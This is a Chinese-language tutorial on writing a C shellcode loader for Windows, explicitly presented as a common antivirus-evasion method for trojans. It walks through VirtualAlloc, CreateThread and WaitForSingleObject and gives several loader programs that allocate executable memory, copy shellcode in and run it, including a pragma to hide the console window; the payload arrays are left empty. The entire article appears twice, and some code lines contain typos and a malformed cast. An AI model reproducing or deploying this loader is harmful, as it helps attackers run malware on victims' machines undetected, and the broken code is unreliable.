# 精讲C通用shellcode加载器

#### 前言：

shellcode加载器是最常用的免杀方式，其中的原理也大相径庭，及开辟空间，注入shellcode，执行线程。并且随着当前各种编程语言的发展，拥有了各种加载shellcode的方式，但是无论怎样，大都基都会调用windows的底层api函数`VirualAlloc()`来开辟内存空间。

**本文涉及三个windows api函数**

#### VirtualAlloc()函数

`VirtualAlloc()`函数是windows的api函数，它包含在windows系统的Kernel32.dll文件中。编程时只需要直接调用即可，不需要在进行下载；VirtualAlloc()函数通常用来分配大块的内存，并且VirtualAlloc()开辟的内存空间为虚拟内存

```
VirtualAlloc(LPVOID ipAddress,DWORD dwSize,DWORD flAllocationType,DWORD,flProtect);
/*
作用:
    该函数的功能时在调用进程的虚地址空间,预提交或者提交一部分页（简单点来说就是分配内存空间）
参数:
    LPVOID ipAddres 需要分配的内存区域的地址
    DWORD dwSize 分配的大小
    DWORD flAllocationType 分配的类型
    DWORD flProtect 该内存的初始保护属性
返回值:
    调用成功,返回分配的首地址;调用失败,返回NULL
*/
```

#### CreateThread()函数

`CreateThread()`函数是windows的api函数，用于创建一个线程以在调用进程的虚拟地址空间执行

```
HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes, 
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    _drv_aliasesMem LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);
/*
参数:
    lpThreadAttributes 指向SECURITY_ATTRIBUTES结构的指针,用于定义新线程的安全属性,一般设置为NULL
    dwStackSize 分配以字节数表示的线程堆栈的大小,默认值为0
    lpStartAddress 指向一个线程函数地址。每个线程都有自己的线程函数,线程函数是线程执行的代码
    lpParameter 传递给线程函数的参数
    dwCreationFlags 表示创建线程的运行状态,其中CREATE_SUSPEND表示挂起当前创建的线程,而0表示理解执行当前创建的线程
    lpThreadID 返回新创建的线程的ID编号
返回值:
    如果函数调用成功,则返回新线程的语柄,调用WaitForSingleObject函数等待所创建线程的运行结束
*/
```

#### WaitForSingleObject()函数

`WaitForSingleObject()`函数用于检测hHandle时间的信号状态，在某一线程种调用该函数，线程暂时挂起，如果在观其的DwMillisecond毫秒内，线程所等待的对象变为有信号状态，则函数立即返回；如果时间已经到了DwMilliseconds毫秒，但是hHandle所指向的对象还没有变成有信号状态，函数照样返回。

```
DWORD WaitForSingleObject(
    HANDLE hHandle,
    DWORD DwMilliseconds
);
/*
参数:
    hHandle 指定对象或时间的语柄
    dwMilliseconds 等待时间，以毫秒为单位，当超过等待时间时，此函数返回。如果参数设置为0，则该函数立即返回；如果设置为INFINITE，则函数一直到有信号才返回
*/
```

#### shellcode加载器原理图：

木马在工作时，一般为如下流程

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612018895688-d37a25cb-f76d-4223-8588-98e2f7195547.png)

#### C代码shellcode加载器

```
#include<stdio.h>
#include<windows.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") //防止运行时打开黑窗口
int main(){
    unsigned char shellcode[] = ""; //这里定义无符号的字符数组用来存储16进制的shellcode
    LPVOID p = VirtualAlloc(0,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    /*
        LPVOID p 定义一个空指针,类似于void *
        利用VirtualAlloc()分配了一个开始地址随机的大小为sizeof(shellcode)的内存地址
        MEM_COMMIT 为指定地址提交物理内存
        PAGE_EXECUTE_READWRITE 该内存区域可以执行代码,应用程序可以读写该区域
    */
    if(p != NULL){//判断分配的内存是否为空
        ((void(*)())p)();
        /*
            void(*) 定义一个空指针
            void(*)() 定义一个空指针函数
            (void(*)())p 将空指针p强制类型转换为空指针函数
            ((void(*)())p)() 调用该函数
        */
    }
    return 0;
}
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612005696248-d66ec6c7-b27d-43d1-bb61-0599bb582796.png)

#### 指针函数调用加载shellcode

这里有个很深的概念，与指针有关，也是最容易混淆的

```
#include<stdio.h>
void shellcode(){
    printf("hello world!\n");
}
int main(){
    printf("%p\n",shellcode); //这里是shellcode的地址，为0x401132
    ((void(*)())(0x401132))(); //这里在进行强制类型转换为指针函数后进行调用,类似于直接调用了shellcode()
    return 0;
}
```

因为函数本质来上将就是指针，所以转来转去，其实是饶了一圈，没有实际意义，但是为什么要这样写呢？这就要比较这两种写法了

```
#include<Windows.h>
#include<stdio.h>
unsigned char shellcode[] = "";
int main(){
    ((void(*)())&shellcode)(); //此时的shellcode是存放shellcode的变量,需要找到shellcode的地址,及&shellcode
    return 0;
}
#include<Windows.h>
#include<stdio.h>
unsigned char buf[] = "";
int main(){
    void *shellcode = (void*)VirualAlloc(0,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    ((void)(*)())shellcode)(); //此时的shellcode本身就是地址,不需要&
    return 0;
}
```

第一种和第二种方式，其执行的主要方式都是找到要执行的内存地址，将放入内存shellcode强制转变为函数，然后执行该函数。其要点都是寻址

在执行第一种的时候，可能还会出现一些问题

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612020706974-c781dcd3-b487-4133-a607-bdd571743e93.png)

原因是：在执行shellcode时，需要该内存区域对代码具有可读，可写，可执行的权限，而实际情况则为在该内存区域只具有可读，可写，但却没有可执行权限

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612020808489-0e954716-a46e-4cf2-b6a1-d16d3438ac62.png)

上述执行方法，是定位放入shellcode内存位置，并以函数形式返回回来，最后用函数方式调用加载shellcode

#### 加载器完整过程代码

```
#inculde<stdio.h>
#include<Windows.h>
int main(int argc, char *argv[]){ //入口函数
    unsigned char buf[] = "";//获取shellcode
    int shellcode_size = sizeof(buf);// 获取shellcode长度
    DWORD dwThreadId; //定义线程ID
    HANDLE hHandle; //线程语柄
    
    char *shellcode = (char*)VirtualAlloc(
    NULL, //基地址
    shellcode_size, //shellcode大小
    MEM_COMMIT, //内存页状态
    PAGE_EXECUTE_READWRITE //定义内存页对代码可读,可写,可执行权限
    );
    //将shellcode复制到可执行的内存页种
    CopyMemory(shellcode,buf,shellcode_size); //内存空间申请
    
    hHandle = CreateThread(
        NULL,//安全描述符
        NULL,//栈的大小
        (LPTHREAD_START_ROUTINE)shellcode,//执行的函数
        NULL,//参数
        NULL,//线程标志
        &dwThreadId//线程ID
    );//创建线程
    
    WaitForSingleObject(hHandle,INFINITE);//一直等待线程执行结束
    return 0;
}
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612021800451-2a9f6f73-1450-40a6-9cd0-1646ab0b4e8f.png)前言：

shellcode加载器是最常用的免杀方式，其中的原理也大相径庭，及开辟空间，注入shellcode，执行线程。并且随着当前各种编程语言的发展，拥有了各种加载shellcode的方式，但是无论怎样，大都基都会调用windows的底层api函数`VirualAlloc()`来开辟内存空间。

**本文涉及三个windows api函数**

#### VirtualAlloc()函数

`VirtualAlloc()`函数是windows的api函数，它包含在windows系统的Kernel32.dll文件中。编程时只需要直接调用即可，不需要在进行下载；VirtualAlloc()函数通常用来分配大块的内存，并且VirtualAlloc()开辟的内存空间为虚拟内存

```
VirtualAlloc(LPVOID ipAddress,DWORD dwSize,DWORD flAllocationType,DWORD,flProtect);
/*
作用:
    该函数的功能时在调用进程的虚地址空间,预提交或者提交一部分页（简单点来说就是分配内存空间）
参数:
    LPVOID ipAddres 需要分配的内存区域的地址
    DWORD dwSize 分配的大小
    DWORD flAllocationType 分配的类型
    DWORD flProtect 该内存的初始保护属性
返回值:
    调用成功,返回分配的首地址;调用失败,返回NULL
*/
```

#### CreateThread()函数

`CreateThread()`函数是windows的api函数，用于创建一个线程以在调用进程的虚拟地址空间执行

```
HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes, 
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    _drv_aliasesMem LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);
/*
参数:
    lpThreadAttributes 指向SECURITY_ATTRIBUTES结构的指针,用于定义新线程的安全属性,一般设置为NULL
    dwStackSize 分配以字节数表示的线程堆栈的大小,默认值为0
    lpStartAddress 指向一个线程函数地址。每个线程都有自己的线程函数,线程函数是线程执行的代码
    lpParameter 传递给线程函数的参数
    dwCreationFlags 表示创建线程的运行状态,其中CREATE_SUSPEND表示挂起当前创建的线程,而0表示理解执行当前创建的线程
    lpThreadID 返回新创建的线程的ID编号
返回值:
    如果函数调用成功,则返回新线程的语柄,调用WaitForSingleObject函数等待所创建线程的运行结束
*/
```

#### WaitForSingleObject()函数

`WaitForSingleObject()`函数用于检测hHandle时间的信号状态，在某一线程种调用该函数，线程暂时挂起，如果在观其的DwMillisecond毫秒内，线程所等待的对象变为有信号状态，则函数立即返回；如果时间已经到了DwMilliseconds毫秒，但是hHandle所指向的对象还没有变成有信号状态，函数照样返回。

```
DWORD WaitForSingleObject(
    HANDLE hHandle,
    DWORD DwMilliseconds
);
/*
参数:
    hHandle 指定对象或时间的语柄
    dwMilliseconds 等待时间，以毫秒为单位，当超过等待时间时，此函数返回。如果参数设置为0，则该函数立即返回；如果设置为INFINITE，则函数一直到有信号才返回
*/
```

#### shellcode加载器原理图：

木马在工作时，一般为如下流程

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612018895688-d37a25cb-f76d-4223-8588-98e2f7195547.png)

#### C代码shellcode加载器

```
#include<stdio.h>
#include<windows.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") //防止运行时打开黑窗口
int main(){
    unsigned char shellcode[] = ""; //这里定义无符号的字符数组用来存储16进制的shellcode
    LPVOID p = VirtualAlloc(0,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    /*
        LPVOID p 定义一个空指针,类似于void *
        利用VirtualAlloc()分配了一个开始地址随机的大小为sizeof(shellcode)的内存地址
        MEM_COMMIT 为指定地址提交物理内存
        PAGE_EXECUTE_READWRITE 该内存区域可以执行代码,应用程序可以读写该区域
    */
    if(p != NULL){//判断分配的内存是否为空
        ((void(*)())p)();
        /*
            void(*) 定义一个空指针
            void(*)() 定义一个空指针函数
            (void(*)())p 将空指针p强制类型转换为空指针函数
            ((void(*)())p)() 调用该函数
        */
    }
    return 0;
}
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612005696248-d66ec6c7-b27d-43d1-bb61-0599bb582796.png)

#### 指针函数调用加载shellcode

这里有个很深的概念，与指针有关，也是最容易混淆的

```
#include<stdio.h>
void shellcode(){
    printf("hello world!\n");
}
int main(){
    printf("%p\n",shellcode); //这里是shellcode的地址，为0x401132
    ((void(*)())(0x401132))(); //这里在进行强制类型转换为指针函数后进行调用,类似于直接调用了shellcode()
    return 0;
}
```

因为函数本质来上将就是指针，所以转来转去，其实是饶了一圈，没有实际意义，但是为什么要这样写呢？这就要比较这两种写法了

```
#include<Windows.h>
#include<stdio.h>
unsigned char shellcode[] = "";
int main(){
    ((void(*)())&shellcode)(); //此时的shellcode是存放shellcode的变量,需要找到shellcode的地址,及&shellcode
    return 0;
}
#include<Windows.h>
#include<stdio.h>
unsigned char buf[] = "";
int main(){
    void *shellcode = (void*)VirualAlloc(0,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    ((void)(*)())shellcode)(); //此时的shellcode本身就是地址,不需要&
    return 0;
}
```

第一种和第二种方式，其执行的主要方式都是找到要执行的内存地址，将放入内存shellcode强制转变为函数，然后执行该函数。其要点都是寻址

在执行第一种的时候，可能还会出现一些问题

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612020706974-c781dcd3-b487-4133-a607-bdd571743e93.png)

原因是：在执行shellcode时，需要该内存区域对代码具有可读，可写，可执行的权限，而实际情况则为在该内存区域只具有可读，可写，但却没有可执行权限

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612020808489-0e954716-a46e-4cf2-b6a1-d16d3438ac62.png)

上述执行方法，是定位放入shellcode内存位置，并以函数形式返回回来，最后用函数方式调用加载shellcode

#### 加载器完整过程代码

```
#inculde<stdio.h>
#include<Windows.h>
int main(int argc, char *argv[]){ //入口函数
    unsigned char buf[] = "";//获取shellcode
    int shellcode_size = sizeof(buf);// 获取shellcode长度
    DWORD dwThreadId; //定义线程ID
    HANDLE hHandle; //线程语柄
    
    char *shellcode = (char*)VirtualAlloc(
    NULL, //基地址
    shellcode_size, //shellcode大小
    MEM_COMMIT, //内存页状态
    PAGE_EXECUTE_READWRITE //定义内存页对代码可读,可写,可执行权限
    );
    //将shellcode复制到可执行的内存页种
    CopyMemory(shellcode,buf,shellcode_size); //内存空间申请
    
    hHandle = CreateThread(
        NULL,//安全描述符
        NULL,//栈的大小
        (LPTHREAD_START_ROUTINE)shellcode,//执行的函数
        NULL,//参数
        NULL,//线程标志
        &dwThreadId//线程ID
    );//创建线程
    
    WaitForSingleObject(hHandle,INFINITE);//一直等待线程执行结束
    return 0;
}
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/12423555/1612021800451-2a9f6f73-1450-40a6-9cd0-1646ab0b4e8f.png)